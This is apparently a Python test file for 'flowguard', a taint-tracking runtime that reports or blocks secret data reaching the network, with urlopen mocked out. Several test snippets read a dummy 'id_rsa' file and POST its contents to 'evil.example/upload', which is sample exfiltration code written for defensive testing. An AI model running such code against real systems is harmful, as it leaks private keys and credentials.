from __future__ import annotations

import tempfile
import unittest
from pathlib import Path
from typing import Any
from urllib import request

from flowguard import FlowguardBlocked, FlowguardRuntime


class PrecisionLossTests(unittest.TestCase):
    def test_warn_mode_reports_json_precision_loss_and_allows_send(self) -> None:
        calls: list[dict[str, Any]] = []
        original_urlopen = request.urlopen

        def fake_urlopen(req: Any, data: Any = None, *args: Any, **kwargs: Any) -> bytes:
            calls.append({"req": req, "data": data, "args": args, "kwargs": kwargs})
            return b"ok"

        request.urlopen = fake_urlopen
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                secret_path = Path(tmpdir) / "id_rsa"
                secret_path.write_text("PRIVATE KEY", encoding="utf-8")
                runtime = FlowguardRuntime(secret_paths=[secret_path])

                runtime.run_python(
                    JSON_DUMPS_SEND_CODE,
                    inputs={
                        "secret_path": str(secret_path),
                        "url": "https://telemetry.example/event",
                    },
                )

                report = runtime.report()

                self.assertEqual(len(calls), 1)
                self.assertEqual(report.summary.precision_loss_count, 1)
                self.assertEqual(report.summary.violation_count, 0)
                self.assertEqual(report.summary.allowed_send_count, 1)
                self.assertEqual(report.precision_losses[0].operation, "json.dumps")
                self.assertEqual(report.precision_losses[0].labels, ["Secret"])
                self.assertIn(f"file:{secret_path}", report.precision_losses[0].sources)
        finally:
            request.urlopen = original_urlopen

    def test_strict_mode_blocks_send_after_json_precision_loss(self) -> None:
        calls: list[dict[str, Any]] = []
        original_urlopen = request.urlopen

        def fake_urlopen(req: Any, data: Any = None, *args: Any, **kwargs: Any) -> bytes:
            calls.append({"req": req, "data": data, "args": args, "kwargs": kwargs})
            return b"ok"

        request.urlopen = fake_urlopen
        try:
            with tempfile.TemporaryDirectory() as tmpdir:
                secret_path = Path(tmpdir) / "id_rsa"
                secret_path.write_text("PRIVATE KEY", encoding="utf-8")
                runtime = FlowguardRuntime(
                    secret_paths=[secret_path],
                    precision_mode="strict",
                )

                with self.assertRaises(FlowguardBlocked) as blocked:
                    runtime.run_python(
                        JSON_DUMPS_SEND_CODE,
                        inputs={
                            "secret_path": str(secret_path),
                            "url": "https://evil.example/upload",
                        },
                    )

                report = runtime.report()

                self.assertEqual(calls, [])
                self.assertEqual(blocked.exception.policy, "TaintPrecisionLostToNetwork")
                self.assertEqual(report.summary.precision_loss_count, 1)
                self.assertEqual(report.summary.violation_count, 1)
                self.assertEqual(
                    report.violations[0].policy,
                    "TaintPrecisionLostToNetwork",
                )
                self.assertEqual(
                    report.violations[0].precision_loss["operation"],
                    "json.dumps",
                )
        finally:
            request.urlopen = original_urlopen

    def test_safe_json_dump_does_not_emit_precision_loss(self) -> None:
        calls: list[dict[str, Any]] = []
        original_urlopen = request.urlopen

        def fake_urlopen(req: Any, data: Any = None, *args: Any, **kwargs: Any) -> bytes:
            calls.append({"req": req, "data": data, "args": args, "kwargs": kwargs})
            return b"ok"

        request.urlopen = fake_urlopen
        try:
            runtime = FlowguardRuntime(precision_mode="strict")

            runtime.run_python(
                """
import json
import urllib.request
payload = json.dumps({"status": "ok"})
req = urllib.request.Request(url, data=payload.encode("utf-8"), method="POST")
urllib.request.urlopen(req)
""",
                inputs={"url": "https://telemetry.example/event"},
            )

            report = runtime.report()

            self.assertEqual(len(calls), 1)
            self.assertEqual(report.summary.precision_loss_count, 0)
            self.assertEqual(report.summary.allowed_send_count, 1)
        finally:
            request.urlopen = original_urlopen

    def test_direct_tracked_transform_blocks_without_precision_loss(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            secret_path = Path(tmpdir) / "id_rsa"
            secret_path.write_text("PRIVATE KEY", encoding="utf-8")
            runtime = FlowguardRuntime(secret_paths=[secret_path], precision_mode="strict")

            with self.assertRaises(FlowguardBlocked) as blocked:
                runtime.run_python(
                    """
import urllib.request
with open(secret_path) as handle:
    secret = handle.read()
payload = secret.replace("PRIVATE", "PUBLIC").lower().encode("utf-8")
req = urllib.request.Request(url, data=payload, method="POST")
urllib.request.urlopen(req)
""",
                    inputs={
                        "secret_path": str(secret_path),
                        "url": "https://evil.example/upload",
                    },
                )

            report = runtime.report()

            self.assertEqual(blocked.exception.policy, "SecretToNetwork")
            self.assertEqual(report.summary.precision_loss_count, 0)
            self.assertEqual(report.violations[0].policy, "SecretToNetwork")

    def test_bytes_wrapper_reports_precision_loss(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            secret_path = Path(tmpdir) / "id_rsa"
            secret_path.write_text("PRIVATE KEY", encoding="utf-8")
            runtime = FlowguardRuntime(secret_paths=[secret_path])

            runtime.run_python(
                """
with open(secret_path) as handle:
    secret = handle.read()
payload = bytes(secret, "utf-8")
""",
                inputs={"secret_path": str(secret_path)},
            )

            report = runtime.report()

            self.assertEqual(report.summary.precision_loss_count, 1)
            self.assertEqual(report.precision_losses[0].operation, "bytes")

    def test_str_wrapper_reports_precision_loss_for_container_repr(self) -> None:
        with tempfile.TemporaryDirectory() as tmpdir:
            secret_path = Path(tmpdir) / "id_rsa"
            secret_path.write_text("PRIVATE KEY", encoding="utf-8")
            runtime = FlowguardRuntime(secret_paths=[secret_path])

            runtime.run_python(
                """
with open(secret_path) as handle:
    secret = handle.read()
payload = str({"key": secret})
""",
                inputs={"secret_path": str(secret_path)},
            )

            report = runtime.report()

            self.assertEqual(report.summary.precision_loss_count, 1)
            self.assertEqual(report.precision_losses[0].operation, "str")

    def test_invalid_precision_mode_is_rejected(self) -> None:
        with self.assertRaises(ValueError):
            FlowguardRuntime(precision_mode="invalid")


JSON_DUMPS_SEND_CODE = """
import json
import urllib.request

with open(secret_path) as handle:
    secret = handle.read()

payload = json.dumps({"key": secret})
req = urllib.request.Request(url, data=payload.encode("utf-8"), method="POST")
urllib.request.urlopen(req)
"""


if __name__ == "__main__":
    unittest.main()
